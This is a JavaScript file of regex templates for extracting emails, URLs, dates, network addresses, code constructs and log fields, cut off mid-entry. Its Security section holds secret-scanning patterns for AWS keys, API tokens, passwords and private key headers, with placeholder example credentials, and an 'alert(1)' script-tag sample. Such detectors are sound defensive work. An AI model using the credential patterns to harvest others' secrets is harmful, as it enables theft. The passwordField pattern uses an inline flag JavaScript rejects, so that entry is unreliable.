export const REGEX_PATTERN_TEMPLATES = {
  /* Common */
  email: {
    id: 'email',
    category: 'Common',
    name: 'Email Address',
    description: 'Extract email addresses',
    pattern: '[a-zA-Z0-9._+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}',
    flags: 'g',
    explanation: 'Matches basic email format.',
    examples: [
      'john.doe@example.com',
      'user+tag@company.co.uk'
    ],
  },

  url: {
    id: 'url',
    category: 'Common',
    name: 'URL',
    description: 'Extract HTTP/HTTPS URLs',
    pattern: 'https?:\\/\\/[\\w.-]+(?:\\/[\\w\\-._~:/?#[\\]@!$&\'()*+,;=%]*)?',
    flags: 'gi',
    explanation: 'Matches URLs without capturing trailing punctuation.',
    examples: [
      'https://example.com',
      'http://site.com/path?query=1'
    ],
  },

  number: {
    id: 'number',
    category: 'Common',
    name: 'Numeric Value',
    description: 'Extract integers and decimals',
    pattern: '-?\\d+(?:\\.\\d+)?',
    flags: 'g',
    explanation: 'Matches numbers with optional decimal.',
    examples: ['42', '-1.5'],
  },

  integer: {
    id: 'integer',
    category: 'Common',
    name: 'Integer',
    description: 'Extract whole integers',
    pattern: '-?\\d+',
    flags: 'g',
    explanation: 'Matches whole numbers including negative.',
    examples: ['12', '-40'],
  },

  username: {
    id: 'username',
    category: 'Common',
    name: 'Usernames',
    description: 'Extract usernames starting with @',
    pattern: '@[a-zA-Z0-9_]{3,16}\\b',
    flags: 'g',
    explanation: 'Matches @ mentions with 3-16 characters.',
    examples: ['@john_doe', '@user123'],
  },

  semver: {
    id: 'semver',
    category: 'Common',
    name: 'Semantic Versions',
    description: 'Extract semver versions',
    pattern: '\\b(\\d+)\\.(\\d+)\\.(\\d+)(?:-[\\w.-]+)?\\b',
    flags: 'g',
    explanation: 'Matches semantic versioning like 1.2.3 or 3.1.0-beta.',
    examples: ['1.2.3', '3.1.0-beta'],
  },

  currency: {
    id: 'currency',
    category: 'Common',
    name: 'Currency Amounts',
    description: 'Extract prices with currency symbols',
    pattern: '[$€£]\\s?\\d{1,3}(?:,?\\d{3})*(?:\\.\\d{2})?',
    flags: 'g',
    explanation: 'Matches currency amounts like $19.99 or €1,200.',
    examples: ['$19.99', '€1,200'],
  },

  /* Dates */
  isodate: {
    id: 'isodate',
    category: 'Dates',
    name: 'ISO Date (YYYY-MM-DD)',
    description: 'Extract ISO dates',
    pattern: '\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])',
    flags: 'g',
    explanation: 'Matches ISO date format YYYY-MM-DD.',
    examples: ['2024-01-20'],
  },

  datetime: {
    id: 'datetime',
    category: 'Dates',
    name: 'ISO DateTime',
    description: 'Extract ISO datetimes',
    pattern: '\\d{4}-\\d{2}-\\d{2}[ T](?:[01]\\d|2[0-3]):[0-5]\\d(?::[0-5]\\d)?',
    flags: 'g',
    explanation: 'Matches ISO datetime with optional seconds.',
    examples: ['2024-02-14 13:50:22'],
  },

  time: {
    id: 'time',
    category: 'Dates',
    name: 'Time (HH:MM:SS)',
    description: 'Extract time values',
    pattern: '(?:[01]\\d|2[0-3]):[0-5]\\d(?::[0-5]\\d)?',
    flags: 'g',
    explanation: 'Matches time in 24-hour format.',
    examples: ['14:30:45', '09:15'],
  },

  /* Identifiers */
  uuid: {
    id: 'uuid',
    category: 'Identifiers',
    name: 'UUID v1–v5',
    description: 'Extract UUID/GUID strings',
    pattern: '\\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}\\b',
    flags: 'g',
    explanation: 'Matches UUID format with version validation.',
    examples: ['550e8400-e29b-41d4-a716-446655440000'],
  },

  jwt: {
    id: 'jwt',
    category: 'Security',
    name: 'JWT Token',
    description: 'Extract JWT tokens',
    pattern: '[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+',
    flags: 'g',
    explanation: 'Matches JWT format with three dot-separated parts.',
    examples: ['eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
  },

  base64: {
    id: 'base64',
    category: 'Security',
    name: 'Base64 String',
    description: 'Extract base64 encoded strings',
    pattern: '[A-Za-z0-9+/]{20,}={0,2}',
    flags: 'g',
    explanation: 'Matches base64 strings of at least 20 characters.',
    examples: ['SGVsbG8gV29ybGQ='],
  },

  /* Network */
  ipv4: {
    id: 'ipv4',
    category: 'Network',
    name: 'IPv4 Address',
    description: 'Extract IPv4 addresses',
    pattern: '\\b(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b',
    flags: 'g',
    explanation: 'Matches valid IPv4 addresses.',
    examples: ['192.168.1.1', '8.8.8.8'],
  },

  ipv6: {
    id: 'ipv6',
    category: 'Network',
    name: 'IPv6 Address',
    description: 'Extract IPv6 addresses',
    pattern: '\\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\\b',
    flags: 'g',
    explanation: 'Matches full IPv6 format.',
    examples: ['2001:0db8:85a3:0000:0000:8a2e:0370:7334'],
  },

  cidr: {
    id: 'cidr',
    category: 'Network',
    name: 'CIDR Notation',
    description: 'Extract CIDR notation',
    pattern: '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\/\\d{1,2}\\b',
    flags: 'g',
    explanation: 'Matches CIDR notation like 192.168.0.0/24.',
    examples: ['192.168.0.0/24', '10.0.0.0/8'],
  },

  /* Text */
  word: {
    id: 'word',
    category: 'Text',
    name: 'Words',
    description: 'Extract individual words',
    pattern: '\\b\\w+\\b',
    flags: 'g',
    explanation: 'Matches word boundaries.',
    examples: ['hello', 'world123'],
  },

  quoted: {
    id: 'quoted',
    category: 'Text',
    name: 'Quoted Text',
    description: 'Extract quoted strings',
    pattern: '"([^"]*)"|\'([^\']*)\'',
    flags: 'g',
    explanation: 'Matches single or double quoted text.',
    examples: ['"hello"', "'world'"],
  },

  camel: {
    id: 'camelcase',
    category: 'Text',
    name: 'camelCase Words',
    description: 'Extract camelCase identifiers',
    pattern: '\\b[a-z]+(?:[A-Z][a-z]+)+\\b',
    flags: 'g',
    explanation: 'Matches camelCase variable names.',
    examples: ['myVariable', 'getUserData'],
  },

  snake: {
    id: 'snakecase',
    category: 'Text',
    name: 'snake_case Words',
    description: 'Extract snake_case identifiers',
    pattern: '\\b[a-z]+(?:_[a-z0-9]+)*\\b',
    flags: 'g',
    explanation: 'Matches snake_case variable names.',
    examples: ['my_variable', 'user_id'],
  },

  /* Social */
  hashtag: {
    id: 'hashtag',
    category: 'Social',
    name: 'Hashtags',
    description: 'Extract hashtags',
    pattern: '#[A-Za-z0-9_]+',
    flags: 'g',
    explanation: 'Matches hashtags starting with #.',
    examples: ['#webdev', '#python2024'],
  },

  mention: {
    id: 'mention',
    category: 'Social',
    name: 'Mentions',
    description: 'Extract @mentions',
    pattern: '@[A-Za-z0-9_]+',
    flags: 'g',
    explanation: 'Matches @mentions.',
    examples: ['@john_doe', '@twitter'],
  },

  /* Business */
  orderId: {
    id: 'order-id',
    category: 'Business',
    name: 'Order # Numbers',
    description: 'Extract order numbers',
    pattern: '[Oo]rder\\s*#?(\\d+)',
    flags: 'g',
    explanation: 'Matches order identifiers.',
    examples: ['Order #1234', 'order 5678'],
  },

  invoice: {
    id: 'invoice',
    category: 'Business',
    name: 'Invoice Numbers',
    description: 'Extract invoice identifiers',
    pattern: '\\bINV[- ]?\\d+\\b',
    flags: 'gi',
    explanation: 'Matches invoice numbers.',
    examples: ['INV-2024-001', 'INV 9999'],
  },

  sku: {
    id: 'sku',
    category: 'Business',
    name: 'SKU Codes',
    description: 'Extract SKU codes',
    pattern: '\\b[A-Z0-9]{2,}-[A-Z0-9]+(?:-[A-Z0-9]+)?\\b',
    flags: 'gi',
    explanation: 'Matches product SKU codes.',
    examples: ['SKU-1234', 'PROD-5678-XL'],
  },

  ticker: {
    id: 'ticker',
    category: 'Business',
    name: 'Stock Ticker Symbols',
    description: 'Extract stock ticker symbols',
    pattern: '\\b[A-Z]{1,5}\\b',
    flags: 'g',
    explanation: 'Matches stock ticker symbols.',
    examples: ['AAPL', 'MSFT', 'TSLA'],
  },

  /* Web */
  htmlTag: {
    id: 'html-tag',
    category: 'Web',
    name: 'HTML Tags',
    description: 'Extract HTML tags',
    pattern: '<\\/?[a-zA-Z][a-zA-Z0-9-]*(?:\\s[^>]+)?>',
    flags: 'g',
    explanation: 'Matches HTML opening and closing tags.',
    examples: ['<div>', '</span>', '<img src="test.jpg">'],
  },

  htmlComment: {
    id: 'html-comment',
    category: 'Web',
    name: 'HTML Comments',
    description: 'Extract HTML comments',
    pattern: '<!--[\\s\\S]*?-->',
    flags: 'g',
    explanation: 'Matches HTML comments.',
    examples: ['<!-- comment -->', '<!--\n  multi-line\n-->'],
  },

  queryParam: {
    id: 'query-param',
    category: 'Web',
    name: 'URL Query Parameters',
    description: 'Extract query parameters',
    pattern: '[?&]([^=]+)=([^&#]+)',
    flags: 'g',
    explanation: 'Matches URL query parameters.',
    examples: ['?foo=bar', '&id=123'],
  },

  markdownLink: {
    id: 'mdlink',
    category: 'Web',
    name: 'Markdown Links',
    description: 'Extract markdown links',
    pattern: '\\[([^\\]]+)\\]\\(([^)]+)\\)',
    flags: 'g',
    explanation: 'Matches markdown link syntax.',
    examples: ['[Google](https://google.com)'],
  },

  /* Location */
  usZip: {
    id: 'uszip',
    category: 'Location',
    name: 'US ZIP Codes',
    description: 'Extract US ZIP codes',
    pattern: '\\b\\d{5}(?:-\\d{4})?\\b',
    flags: 'g',
    explanation: 'Matches US ZIP codes with optional +4.',
    examples: ['10001', '90210-1234'],
  },

  ukPostcode: {
    id: 'uk-postcode',
    category: 'Location',
    name: 'UK Postcodes',
    description: 'Extract UK postcodes',
    pattern: '\\b[A-Z]{1,2}\\d[A-Z\\d]? \\d[A-Z]{2}\\b',
    flags: 'gi',
    explanation: 'Matches UK postcode format.',
    examples: ['SW1A 1AA', 'B33 8TH'],
  },

  latlong: {
    id: 'latlong',
    category: 'Location',
    name: 'Latitude & Longitude',
    description: 'Extract coordinates',
    pattern: '[-+]?\\d{1,2}\\.\\d+[, ]+[-+]?\\d{1,3}\\.\\d+',
    flags: 'g',
    explanation: 'Matches latitude, longitude pairs.',
    examples: ['40.7128, -74.0060', '51.5074,-0.1278'],
  },

  /* Programming */
  jsVarName: {
    id: 'js-var-name',
    category: 'Programming',
    name: 'JavaScript Variable Names',
    description: 'Extract valid JS variable identifiers',
    pattern: '\\b[A-Za-z_$][A-Za-z0-9_$]*\\b',
    flags: 'g',
    explanation: 'Matches variable names allowed in JS syntax.',
    examples: ['myVar', '$user_id'],
  },

  jsFunction: {
    id: 'js-function',
    category: 'Programming',
    name: 'JS Function Declarations',
    description: 'Extract function names',
    pattern: '\\bfunction\\s+([A-Za-z_$][A-Za-z0-9_$]*)',
    flags: 'g',
    explanation: 'Matches function declarations like function myFunc()',
    examples: ['function loadData()'],
  },

  arrowFunction: {
    id: 'arrow-func',
    category: 'Programming',
    name: 'Arrow Functions',
    description: 'Detect arrow function expressions',
    pattern: '\\([^)]*\\)\\s*=>',
    flags: 'g',
    explanation: 'Matches arrow functions like (a,b)=>{...}',
    examples: ['(a, b) => a + b'],
  },

  hexNumber: {
    id: 'hex-number',
    category: 'Programming',
    name: 'Hexadecimal Numbers',
    description: 'Extract hex numbers starting with 0x',
    pattern: '0x[0-9a-fA-F]+',
    flags: 'g',
    explanation: 'Matches hexadecimal notation.',
    examples: ['0xFF12', '0xa3'],
  },

  cssRgb: {
    id: 'css-rgb',
    category: 'Programming',
    name: 'CSS rgb() Colors',
    description: 'Extract rgb and rgba color definitions',
    pattern: 'rgba?\\(\\s*\\d{1,3}\\s*,\\s*\\d{1,3}\\s*,\\s*\\d{1,3}(?:\\s*,\\s*(0|1|0?\\.\\d+))?\\s*\\)',
    flags: 'gi',
    explanation: 'Matches CSS color functions.',
    examples: ['rgb(255, 0, 0)', 'rgba(0, 0, 0, 0.5)'],
  },

  /* Security */
  awsAccessKey: {
    id: 'aws-access-key',
    category: 'Security',
    name: 'AWS Access Key',
    description: 'Detect potential leaked AWS access keys',
    pattern: '\\bAKIA[0-9A-Z]{16}\\b',
    flags: 'g',
    explanation: 'Matches AWS access key format.',
    examples: ['AKIAIOSFODNN7EXAMPLE'],
  },

  awsSecret: {
    id: 'aws-secret',
    category: 'Security',
    name: 'AWS Secret Key',
    description: 'Detect leaked AWS secrets',
    pattern: '[A-Za-z0-9/+=]{40}',
    flags: 'g',
    explanation: 'Matches AWS secret key patterns.',
    examples: ['wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'],
  },

  openaiKey: {
    id: 'openai-key',
    category: 'Security',
    name: 'OpenAI API Keys',
    description: 'Detect OpenAI keys starting with sk-',
    pattern: 'sk-[A-Za-z0-9]{32,}',
    flags: 'g',
    explanation: 'Matches OpenAI API key format.',
    examples: ['sk-abc123...'],
  },

  githubToken: {
    id: 'github-token',
    category: 'Security',
    name: 'GitHub Tokens',
    description: 'Detect GitHub personal access tokens',
    pattern: 'gh[pousr]_[A-Za-z0-9]{36}',
    flags: 'g',
    explanation: 'Matches GitHub token formats.',
    examples: ['ghp_1234567890abcdefghijklmnopqrstuvwxyz'],
  },

  passwordField: {
    id: 'password-field',
    category: 'Security',
    name: 'Password Fields',
    description: 'Detect password=xxxx style patterns',
    pattern: '(?i)(password|pwd|pass|secret)[\\s:=]+([^\\s]+)',
    flags: 'g',
    explanation: 'Matches password field assignments.',
    examples: ['password=mySecret123', 'pwd: hidden'],
  },

  /* Web */
  htmlAttr: {
    id: 'html-attr',
    category: 'Web',
    name: 'HTML Attributes',
    description: 'Extract key="value" attributes',
    pattern: '([a-zA-Z-]+)="([^"]*)"',
    flags: 'g',
    explanation: 'Matches HTML attribute pairs.',
    examples: ['class="container"', 'href="page.html"'],
  },

  scriptTag: {
    id: 'script-tag',
    category: 'Web',
    name: 'Script Tags',
    description: 'Extract <script> tags with content',
    pattern: '<script[^>]*>[\\s\\S]*?<\\/script>',
    flags: 'gi',
    explanation: 'Matches script tag blocks.',
    examples: ['<script>alert(1)</script>'],
  },

  styleTag: {
    id: 'style-tag',
    category: 'Web',
    name: 'Style Tags',
    description: 'Extract <style> tag blocks',
    pattern: '<style[^>]*>[\\s\\S]*?<\\/style>',
    flags: 'gi',
    explanation: 'Matches style tag blocks.',
    examples: ['<style>body { color: red; }</style>'],
  },

  imgTag: {
    id: 'img-tag',
    category: 'Web',
    name: '<img> Tags',
    description: 'Extract image tag elements',
    pattern: '<img\\b[^>]*>',
    flags: 'gi',
    explanation: 'Matches image tags.',
    examples: ['<img src="pic.jpg" alt="Image">'],
  },

  mediaUrl: {
    id: 'media-url',
    category: 'Web',
    name: 'Media URLs',
    description: 'Find URLs ending in images/videos',
    pattern: 'https?:\\/\\/[\\w.-]+\\/(?:[\\w.-]+)\\.(?:png|jpg|jpeg|gif|mp4|webm|svg)',
    flags: 'gi',
    explanation: 'Matches media file URLs.',
    examples: ['https://example.com/image.jpg'],
  },

  /* Business & Finance */
  isoCurrency: {
    id: 'iso-currency',
    category: 'Payment',
    name: 'ISO Currency Amounts',
    description: 'Extract amounts in ISO format',
    pattern: '\\b[A-Z]{3}\\s?\\d+(?:\\.\\d{2})?\\b',
    flags: 'g',
    explanation: 'Matches currency code followed by amount.',
    examples: ['USD 100.50', 'EUR500'],
  },

  iban: {
    id: 'iban',
    category: 'Payment',
    name: 'IBAN Numbers',
    description: 'Extract IBAN bank account numbers',
    pattern: '\\b[A-Z]{2}\\d{2}[A-Z0-9]{11,30}\\b',
    flags: 'g',
    explanation: 'Matches International Bank Account Numbers.',
    examples: ['DE89370400440532013000'],
  },

  creditCardStrict: {
    id: 'credit-card-strict',
    category: 'Payment',
    name: 'Credit Card',
    description: 'Detect all major credit card types',
    pattern: '\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5\\d{2})\\d{12})\\b',
    flags: 'g',
    explanation: 'Matches Visa, Mastercard, Amex, Discover.',
    examples: ['4532015112830366', '5425233010103442'],
  },

  skuAdvanced: {
    id: 'sku-advanced',
    category: 'Business',
    name: 'Advanced SKU Codes',
    description: 'Extract advanced SKU code patterns',
    pattern: '\\b[A-Z]{2,5}-\\d{2,8}(?:-[A-Z0-9]{1,6})?\\b',
    flags: 'gi',
    explanation: 'Matches complex SKU formats.',
    examples: ['PROD-123456-XL', 'SKU-99'],
  },

  /* Networking */
  macAddress: {
    id: 'mac-address',
    category: 'Network',
    name: 'MAC Addresses',
    description: 'Extract MAC addresses',
    pattern: '\\b(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}\\b',
    flags: 'g',
    explanation: 'Matches MAC address format.',
    examples: ['00:1A:2B:3C:4D:5E'],
  },

  ipv6Full: {
    id: 'ipv6-full',
    category: 'Network',
    name: 'IPv6 (Full / Compressed)',
    description: 'Extract IPv6 addresses',
    pattern: '\\b(?:(?:[0-9A-Fa-f]{1,4})(?::|$)){2,7}[0-9A-Fa-f]{1,4}\\b',
    flags: 'g',
    explanation: 'Matches full and compressed IPv6.',
    examples: ['2001:db8::1', 'fe80::1'],
  },

  portNumber: {
    id: 'port-number',
    category: 'Network',
    name: 'Port Numbers',
    description: 'Extract port numbers from addresses',
    pattern: ':(\\d{2,5})\\b',
    flags: 'g',
    explanation: 'Matches :port notation.',
    examples: [':8080', ':443'],
  },

  /* Dates */
  rfc2822: {
    id: 'rfc2822',
    category: 'Dates',
    name: 'RFC 2822 Dates',
    description: 'Extract RFC 2822 format dates',
    pattern: '[A-Za-z]{3},\\s\\d{1,2}\\s[A-Za-z]{3}\\s\\d{4}\\s\\d{2}:\\d{2}:\\d{2}\\s[+-]\\d{4}',
    flags: 'g',
    explanation: 'Matches email-standard date format.',
    examples: ['Mon, 14 Feb 2024 13:50:22 +0000'],
  },

  unixTimestamp: {
    id: 'unix-ts',
    category: 'Dates',
    name: 'Unix Timestamp',
    description: 'Extract 10-digit Unix timestamps',
    pattern: '\\b\\d{10}\\b',
    flags: 'g',
    explanation: 'Matches Unix timestamps (seconds since epoch).',
    examples: ['1707902422'],
  },

  /* Text */
  emoji: {
    id: 'emoji',
    category: 'Text',
    name: 'Emoji Characters',
    description: 'Extract emoji characters',
    pattern: '[\\u{1F600}-\\u{1F64F}]',
    flags: 'gu',
    explanation: 'Matches common emoji ranges.',
    examples: ['😀', '😂', '🎉'],
  },

  htmlEntity: {
    id: 'html-entity',
    category: 'Text',
    name: 'HTML Entities',
    description: 'Extract HTML entities',
    pattern: '&[A-Za-z0-9#]+;',
    flags: 'g',
    explanation: 'Matches HTML entity encodings.',
    examples: ['&nbsp;', '&#169;', '&lt;'],
  },

  accentedWords: {
    id: 'accented-words',
    category: 'Text',
    name: 'Accented Words',
    description: 'Extract words with accents',
    pattern: '\\b[\\p{L}]+\\b',
    flags: 'gu',
    explanation: 'Matches words with diacritical marks.',
    examples: ['café', 'naïve', 'Zürich'],
  },

  unicodeLetters: {
    id: 'unicode-letters',
    category: 'Text',
    name: 'Unicode Letters Only',
    description: 'Extract non-ASCII letters',
    pattern: '\\p{L}+',
    flags: 'gu',
    explanation: 'Matches any Unicode letter.',
    examples: ['中文', 'العربية', 'Ελληνικά'],
  },

  /* Social Media */
  tiktokUser: {
    id: 'tiktok-user',
    category: 'Social',
    name: 'TikTok Usernames',
    description: 'Extract TikTok user handles',
    pattern: '@[A-Za-z0-9._]{2,24}',
    flags: 'g',
    explanation: 'Matches TikTok usernames.',
    examples: ['@tiktokuser', '@user_123'],
  },

  youtubeId: {
    id: 'youtube-id',
    category: 'Social',
    name: 'YouTube Video',
    description: 'Extract YouTube video identifiers',
    pattern: '\\b(?:v=|youtu\\.be\\/)([A-Za-z0-9_-]{11})\\b',
    flags: 'gi',
    explanation: 'Matches YouTube video ID formats.',
    examples: ['v=dQw4w9WgXcQ', 'youtu.be/dQw4w9WgXcQ'],
  },

  discordUser: {
    id: 'discord-user',
    category: 'Social',
    name: 'Discord Username + Tag',
    description: 'Extract Discord usernames',
    pattern: '[A-Za-z0-9_]{2,32}#\\d{4}',
    flags: 'g',
    explanation: 'Matches Discord username#tag format.',
    examples: ['Username#0001', 'user_123#9999'],
  },

  /* System */
  windowsPath: {
    id: 'windows-path',
    category: 'System',
    name: 'Windows File Paths',
    description: 'Extract Windows file paths',
    pattern: '[A-Za-z]:\\\\(?:[\\w-]+\\\\)*[\\w.-]+',
    flags: 'g',
    explanation: 'Matches Windows path format.',
    examples: ['C:\\Users\\Name\\file.txt'],
  },

  unixPath: {
    id: 'unix-path',
    category: 'System',
    name: 'Unix Paths',
    description: 'Extract Unix/Linux file paths',
    pattern: '\\/(?:[\\w.-]+\\/)*[\\w.-]+',
    flags: 'g',
    explanation: 'Matches Unix path format.',
    examples: ['/home/user/file.txt', '/var/log/app.log'],
  },

  scientific: {
    id: 'scientific',
    category: 'Numbers',
    name: 'Scientific Notation Numbers',
    description: 'Extract scientific notation numbers',
    pattern: '-?\\d+(?:\\.\\d+)?(?:e[+-]?\\d+)?',
    flags: 'gi',
    explanation: 'Matches scientific notation.',
    examples: ['1.5e-4', '3.14E+10'],
  },

  parcelTracking: {
    id: 'parcel-tracking',
    category: 'Business',
    name: 'Parcel Tracking Numbers',
    description: 'Extract package tracking numbers',
    pattern: '\\b[A-Z0-9]{8,22}\\b',
    flags: 'g',
    explanation: 'Matches tracking number formats.',
    examples: ['1Z999AA10123456784'],
  },

  isbn: {
    id: 'isbn',
    category: 'Business',
    name: 'ISBN Numbers',
    description: 'Extract ISBN book identifiers',
    pattern: '\\b(?:ISBN(?:-1[03])?:?\\s*)?(97[89][- ]?)?\\d{1,5}[- ]?\\d{1,7}[- ]?\\d{1,7}[- ]?[0-9X]\\b',
    flags: 'gi',
    explanation: 'Matches ISBN-10 and ISBN-13.',
    examples: ['978-0-306-40615-2', 'ISBN 9780306406157'],
  },

  htmlId: {
    id: 'html-id',
    category: 'Web',
    name: 'HTML #id Attributes',
    description: 'Extract HTML element IDs',
    pattern: '#[A-Za-z_][A-Za-z0-9_-]*',
    flags: 'g',
    explanation: 'Matches CSS/HTML id selectors.',
    examples: ['#myContainer', '#btn-primary'],
  },

  htmlClass: {
    id: 'html-class',
    category: 'Web',
    name: 'CSS Class Selectors',
    description: 'Extract CSS class names',
    pattern: '\\.[A-Za-z_][A-Za-z0-9_-]*',
    flags: 'g',
    explanation: 'Matches CSS class selectors.',
    examples: ['.container', '.btn-primary'],
  },

  /* Programming - Advanced */
  jsxComponent: {
    id: 'jsx-component',
    category: 'Programming',
    name: 'JSX Component Tags',
    description: 'Extract <Component> JSX tags',
    pattern: '<[A-Z][A-Za-z0-9]*(?:\\s[^>]*)?/?\\s*>',
    flags: 'g',
    explanation: 'Matches JSX component tags.',
    examples: ['<Button />', '<MyCard title="hello">'],
  },

  reactHook: {
    id: 'react-hook',
    category: 'Programming',
    name: 'React Hook Calls',
    description: 'Detect useState, useEffect, etc.',
    pattern: '\\buse[A-Z][A-Za-z]+\\b',
    flags: 'g',
    explanation: 'Matches React hook function names.',
    examples: ['useState', 'useEffect', 'useCallback'],
  },

  importStatement: {
    id: 'import-statement',
    category: 'Programming',
    name: 'ES Module Imports',
    description: 'Extract import statements',
    pattern: 'import\\s+[^;]+;',
    flags: 'g',
    explanation: 'Matches ES6 import statements.',
    examples: ['import React from "react";'],
  },

  exportStatement: {
    id: 'export-statement',
    category: 'Programming',
    name: 'ES Module Exports',
    description: 'Extract export statements',
    pattern: 'export\\s+[^;]+;',
    flags: 'g',
    explanation: 'Matches ES6 export statements.',
    examples: ['export default App;', 'export const func = () => {}'],
  },

  pythonDef: {
    id: 'python-def',
    category: 'Programming',
    name: 'Python Function Definitions',
    description: 'Extract Python function definitions',
    pattern: '^def\\s+([A-Za-z_][A-Za-z0-9_]*)',
    flags: 'gm',
    explanation: 'Matches Python function definitions.',
    examples: ['def my_function():', 'def calculate(x, y):'],
  },

  sqlSelect: {
    id: 'sql-select',
    category: 'Programming',
    name: 'SQL SELECT Statements',
    description: 'Extract SQL queries',
    pattern: '\\bSELECT\\b[\\s\\S]+?\\bFROM\\b',
    flags: 'gi',
    explanation: 'Matches SQL SELECT statements.',
    examples: ['SELECT * FROM users'],
  },

  jsonBlock: {
    id: 'json-block',
    category: 'Programming',
    name: 'Embedded JSON Objects',
    description: 'Extract JSON blocks',
    pattern: '\\{(?:[^{}]|\\{[^{}]*\\})*\\}',
    flags: 'g',
    explanation: 'Matches JSON object structures.',
    examples: ['{"name": "John", "age": 30}'],
  },

  singleComment: {
    id: 'single-comment',
    category: 'Programming',
    name: 'Single-line Comments',
    description: 'Extract single-line comments',
    pattern: '//.*$',
    flags: 'gm',
    explanation: 'Matches // style comments.',
    examples: ['// This is a comment'],
  },

  multiComment: {
    id: 'multi-comment',
    category: 'Programming',
    name: 'Multi-line Comments',
    description: 'Extract multi-line comments',
    pattern: '/\\*[\\s\\S]*?\\*/',
    flags: 'g',
    explanation: 'Matches /* ... */ style comments.',
    examples: ['/* Multi\nline\ncomment */'],
  },

  tailwindClass: {
    id: 'tailwind-class',
    category: 'Programming',
    name: 'Tailwind CSS Classes',
    description: 'Extract Tailwind utility classes',
    pattern: '\\b[a-zA-Z0-9-:]+\\b',
    flags: 'g',
    explanation: 'Matches Tailwind utility class names.',
    examples: ['bg-blue-500', 'text-lg', 'hover:scale-105'],
  },

  /* Logs & Debugging */
  jsStack: {
    id: 'js-stack',
    category: 'Logs',
    name: 'JS Stack Trace Lines',
    description: 'Extract stack trace entries',
    pattern: 'at\\s+[\\w.$]+\\s+\\(([^)]+)\\)',
    flags: 'g',
    explanation: 'Matches JavaScript stack trace lines.',
    examples: ['at myFunction (file.js:10:5)'],
  },

  logLevels: {
    id: 'log-levels',
    category: 'Logs',
    name: 'Common Log Levels',
    description: 'Extract log severity levels',
    pattern: '\\b(INFO|DEBUG|WARN|ERROR|FATAL)\\b',
    flags: 'g',
    explanation: 'Matches log level keywords.',
    examples: ['ERROR', 'DEBUG', 'WARN'],
  },

  httpLog: {
    id: 'http-log',
    category: 'Logs',
    name: 'HTTP Access Log Lines',
    description: 'Extract HTTP request logs',
    pattern: '"(GET|POST|PUT|DELETE|PATCH)\\s+([^"]+)"\\s+(\\d{3})',
    flags: 'g',
    explanation: 'Matches HTTP log entries.',
    examples: ['"GET /api/users" 200'],
  },

  logIp: {
    id: 'log-ip',
    category: 'Logs',
    name: 'IP in Web Logs',
    description: 'Extract IPs from log files',
    pattern: '^\\b\\d{1,3}(?:\\.\\d{1,3}){3}\\b',
    flags: 'gm',
    explanation: 'Matches IP addresses at line start.',
    examples: ['192.168.1.1'],
  },

  logIsoDate: {
    id: 'log-iso',
    category: 'Logs',
    name: 'ISO Timestamp Log Entries',
    description: 'Extract ISO formatted timestamps from logs',
    pattern: '^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}',
    flags: 'gm',
    explanation: 'Matches ISO 8601 timestamps.',
    examples: ['2024-02-14T13:50:22'],
  },

  /* Web - HTML */
  htmlComment2: {
    id: 'html-comment-2',
    category: 'Web',
    name: 'HTML Comments',
    description: 'Extract HTML comment blocks',
    pattern: '<!--[\\s\\S]*?-->',
    flags: 'g',
    explanation: 'Matches HTML comments.',
    examples: ['<!-- This is a comment -->'],
  },

  htmlIdAttr: {
    id: 'html-id-attr',
    category: 'Web',
    name: 'HTML id="..." Attributes',
    description: 'Extract HTML id values',
    pattern: 'id="([^"]+)"',
    flags: 'g',
    explanation: 'Matches HTML id attribute values.',
    examples: ['id="main-container"'],
  },

  htmlClassAttr: {
    id: 'html-class-attr',
    category: 'Web',
    name: 'HTML class="..." Attributes',
    description: 'Extract HTML class values',
    pattern: 'class="([^"]+)"',
    flags: 'g',
    explanation: 'Matches HTML class attribute values.',
    examples: ['class="btn btn-primary"'],
  },

  cssSelector2: {
    id: 'css-selector-2',
    category: 'Web',
    name: 'CSS Selectors',
    description: 'Extract CSS selector patterns',
    pattern: '^[.#]?[A-Za-z0-9_-]+$',
    flags: 'gm',
    explanation: 'Matches CSS selectors.',
    examples: ['.container', '#main', 'div.active'],
  },

  imgSrc: {
    id: 'img-src',
    category: 'Web',
    name: 'Image Source URLs',
    description: 'Extract src URLs from img tags',
    pattern: '<img[^>]+src="([^"]+)"',
    flags: 'gi',
    explanation: 'Matches image source attributes.',
    examples: ['src="image.jpg"', 'src="https://example.com/pic.png"'],
  },

  /* Security - Advanced */
  sshKey: {
    id: 'ssh-key',
    category: 'Security',
    name: 'SSH Public Keys',
    description: 'Extract SSH public key strings',
    pattern: 'ssh-(rsa|ed25519) [A-Za-z0-9+/=]+',
    flags: 'g',
    explanation: 'Matches SSH public key format.',
    examples: ['ssh-rsa AAAAB3NzaC...'],
  },

  privateKeyHeader: {
    id: 'private-key-header',
    category: 'Security',
    name: 'PEM Private Key Headers',
    description: 'Detect PEM key file headers',
    pattern: '-----BEGIN [A-Z ]+PRIVATE KEY-----',
    flags: 'g',
    explanation: 'Matches PEM private key headers.',
    examples: ['-----BEGIN RSA PRIVATE KEY-----'],
  },

  ipv6Cidr: {
    id: 'ipv6-cidr',
    category: 'Network',
    name: 'IPv6 CIDR Notation',
    description: 'Extract IPv6 CIDR ranges',
    pattern: '[0-9A-Fa-f:]+\\/\\d{1,3}',
    flags: 'g',
